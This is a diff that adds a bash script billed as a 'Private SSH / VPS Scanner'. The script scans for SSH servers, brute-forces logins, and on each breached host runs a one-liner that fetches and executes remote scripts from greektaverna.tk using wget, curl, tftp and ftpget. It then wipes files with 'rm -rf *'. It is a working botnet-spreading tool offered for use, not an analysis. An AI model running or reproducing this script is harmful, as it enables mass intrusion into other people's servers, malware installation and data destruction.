@@ -1,0 +1,36 @@
+rm -rf bios.txt
+rm -rf mfu.txt
+rm -rf banner.log
+timeout="68"
+speed="10"
+interface="em1"
+port="22"
+echo -e "\e[34m####################################################"
+echo -e "\e[34m#        \e[32mPrivate SSH / VPS Scanner                 \e[34m#"
+echo -e "\e[34m#        \e[32mDeveloped By Nite Max                     \e[34m#"
+echo -e "\e[34m#        \e[32mDon't Leak This You Piece of Shit!!       \e[34m#"
+echo -e "\e[34m####################################################"
+
+sleep 5
+
+
+
+./motd
+
+
+sleep 1
+timeout $timeout ./shitscanner $port -i $interface -s $speed
+pkill shitscanner
+sleep 2
+./boner bios.txt 22 3500
+pkill boner
+
+victims=`grep -c . bios.txt`
+
+echo -e "\e[35m[PRIVATE] \e[97mHRDMV1 - \e[32mBrute Force Starting !!!"
+echo -e "\e[35m[PRIVATE] \e[97mHRDMV1 - \e[32mWe Have \e[91m$victims \e[32mvulnerable servers"
+sleep 1
+clear
+./brute 7000 -f bios.txt naffey 22 "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://greektaverna.tk/sh; curl -O http://greektaverna.tk/sh; chmod 777 sh; sh sh; tftp greektaverna.tk -c get bins.sh; chmod 777 bins.sh; sh bins.sh; tftp -r .sh -g greektaverna.tk; chmod 777 .sh; sh .sh; ftpget -v -u anonymous -p anonymous -P 21 greektaverna.tk .sh .sh; sh .sh; rm -rf sh bins.sh .sh .sh; rm -rf *"
+clear
+echo -e "\e[35m[PRIVATE] \e[97mHRDMV1 - \e[32mScan Has Been Finished ! All Output has been saved in --> \e[91mgasite.txt"
